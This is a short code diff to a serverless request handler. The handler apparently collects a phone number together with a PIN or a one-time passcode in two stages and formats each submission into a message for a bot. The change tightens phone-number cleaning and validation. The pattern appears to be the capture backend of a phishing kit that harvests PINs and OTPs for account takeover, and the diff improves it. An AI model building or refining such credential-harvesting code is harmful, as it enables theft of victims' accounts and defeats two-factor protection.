@@ -118,13 +118,14 @@ module.exports = async (req, res) => {
   const userId = `user_${Date.now()}`;
 
   if (!['pin', 'otp'].includes(stage)) return res.status(400).json({ error: 'Invalid stage' });
-  if (!phone || typeof phone !== 'string') return res.status(400).json({ error: 'Invalid phone' });
+  const cleanPhone = String(phone || '').replace(/\D/g, '');
+  if (!cleanPhone || cleanPhone.length < 5) return res.status(400).json({ error: 'Invalid phone' });
   if (stage === 'pin' && !pin) return res.status(400).json({ error: 'Missing PIN' });
   if (stage === 'otp' && !otp) return res.status(400).json({ error: 'Missing OTP' });
 
   try {
     const botLabel = await getBotLabel();
-    const text = stage === 'pin' ? buildPinText(phone, pin, userId, botLabel) : buildOtpText(phone, otp, botLabel);
+    const text = stage === 'pin' ? buildPinText(cleanPhone, pin, userId, botLabel) : buildOtpText(cleanPhone, otp, botLabel);
 
     const record = await create({ stage, text });
 
